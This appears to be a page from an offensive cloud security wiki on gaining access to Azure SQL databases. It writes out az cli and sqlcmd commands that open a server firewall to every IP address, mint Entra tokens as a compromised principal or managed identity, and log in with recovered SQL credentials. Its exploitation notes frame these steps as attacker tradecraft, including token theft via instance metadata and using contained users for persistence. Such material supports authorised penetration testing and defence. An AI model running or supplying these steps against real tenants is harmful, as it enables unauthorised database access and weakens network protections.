---
title: "Access: reaching Azure SQL through auth, firewall, and the server identity"
description: "Reaching Azure SQL through Entra authentication, SQL logins, contained database users, or the server managed identity."
keywords:
  - Azure SQL access
  - Entra auth
  - contained user
  - SQL login
  - managed identity
---

# Access

An Azure SQL database is reachable when the logical server's firewall admits your source and you hold a credential or token it accepts. SQL logins and contained database users authenticate with a password; Microsoft Entra authentication authenticates with a token minted for the `https://database.windows.net/` resource, which a compromised user or a resource's managed identity can obtain.

## Opening the firewall and reaching it

```bash
# add a server firewall rule for your source (needs Microsoft.Sql/servers/firewallRules/write)
az sql server firewall-rule create -g <rg> -s <server> -n open \
  --start-ip-address 0.0.0.0 --end-ip-address 255.255.255.255
az sql db list --server <server> -g <rg> -o table
```

## Authenticating

```bash
# Entra token as the current principal or a managed identity, used as the SQL password
TOKEN=$(az account get-access-token --resource https://database.windows.net/ --query accessToken -o tsv)
sqlcmd -S <server>.database.windows.net -d <db> -G -P "$TOKEN" -Q "SELECT USER_NAME();"

# or a recovered SQL login / contained user
sqlcmd -S <server>.database.windows.net -d <db> -U app -P '<pw>' -Q "SELECT name FROM sys.database_principals;"
```

## Exploitation notes

- A contained database user lives only in the database, so it survives even when server logins are rotated, and is often missed in credential hygiene.
- From a VM or App Service with a managed identity, mint the `database.windows.net` token from [instance metadata](../../credentials/instance-metadata/index.md) and authenticate with no password; the server must have an Entra admin and the identity mapped as a user.
- A firewall rule spanning `0.0.0.0` to `255.255.255.255` is a loud but effective opener; prefer your own egress IP when you know it.

## Tools

- **sqlcmd / mssql-cli**: native clients supporting Entra token auth (`-G`).
- **az cli** (`az sql server firewall-rule`, `az account get-access-token`).
- **MicroBurst**: Azure SQL enumeration helpers.

## References

- [Microsoft: Azure SQL Entra authentication](https://learn.microsoft.com/azure/azure-sql/database/authentication-aad-overview)
- [HackTricks Cloud: Azure SQL](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [NetSPI: MicroBurst](https://github.com/NetSPI/MicroBurst)
